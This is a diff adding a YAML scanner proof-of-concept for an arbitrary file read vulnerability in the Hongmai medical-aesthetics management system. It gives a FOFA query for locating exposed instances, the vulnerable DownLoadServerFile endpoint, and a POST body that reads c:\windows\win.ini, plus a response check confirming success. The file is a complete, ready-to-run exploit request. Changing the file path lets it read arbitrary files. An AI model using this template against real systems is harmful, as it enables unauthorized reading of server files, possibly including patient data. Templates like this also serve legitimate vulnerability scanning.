@@ -1,0 +1,18 @@
+id: poc-yaml-hmcsoft-downloadserverfile-anyfile-read
+info:
+  name: 宏脉医美行业管理系统 DownLoadServerFile 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 宏脉医美行业管理系统
+  fofa: title="宏脉医美行业管理系统"
+requests:
+- method: POST
+  path: /zh-CN/PublicInterface/DownLoadServerFile
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: filePath=c:\windows\win.ini
+  expression: "status_code == 200 && \ncontains(body,\"; for 16-bit app support\"\
+    ) &&\ncontains(body,\"[files]\") &&\n!contains(body,\"<\")\n"
+variables: {}
+transport: http
